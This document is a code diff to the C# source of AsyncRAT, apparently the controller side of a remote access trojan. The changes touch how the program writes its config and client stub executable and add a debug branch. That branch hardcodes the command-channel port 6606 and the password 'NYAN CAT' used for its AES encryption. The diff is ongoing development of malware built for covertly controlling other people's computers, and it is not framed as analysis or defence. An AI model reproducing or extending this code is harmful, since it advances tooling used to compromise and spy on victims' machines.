@@ -41,7 +41,7 @@ namespace AsyncRAT_Sharp
             {
                 if (!File.Exists(Path.Combine(Application.StartupPath, Path.GetFileName(Application.ExecutablePath) + ".config")))
                 {
-                    File.WriteAllText(Path.Combine(Application.StartupPath, Path.GetFileName(Application.ExecutablePath) + ".config"), Properties.Resources.AsyncRAT_Sharp_exe);
+                   File.WriteAllText(Path.Combine(Application.StartupPath, Path.GetFileName(Application.ExecutablePath) + ".config"), Properties.Resources.AsyncRAT_Sharp_exe);
                     Process.Start(Application.ExecutablePath);
                     Environment.Exit(0);
                 }
@@ -56,7 +56,7 @@ namespace AsyncRAT_Sharp
                     Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Stub"));
 
                 if (!File.Exists(Path.Combine(Application.StartupPath, "Stub\\Stub.exe")))
-                    File.WriteAllBytes(Path.Combine(Application.StartupPath, "Stub\\Stub.exe"), Properties.Resources.Stub);
+                    MessageBox.Show("Stub Not Found");
             }
             catch (Exception ex)
             {
@@ -67,6 +67,11 @@ namespace AsyncRAT_Sharp
         private async void Form1_Load(object sender, EventArgs e)
         {
             Text = $"{Settings.Version}";
+#if DEBUG
+            Settings.Port = "6606";
+            Settings.Password = "NYAN CAT";
+            Settings.AES = new Aes256(Settings.Password);
+#else
             using (FormPorts portsFrm = new FormPorts())
             {
                 portsFrm.ShowDialog();
@@ -74,6 +79,8 @@ namespace AsyncRAT_Sharp
                 Settings.Password = portsFrm.textPassword.Text;
                 Settings.AES = new Aes256(Settings.Password);
             }
+#endif
+
 
             await Methods.FadeIn(this, 5);
             trans = true;
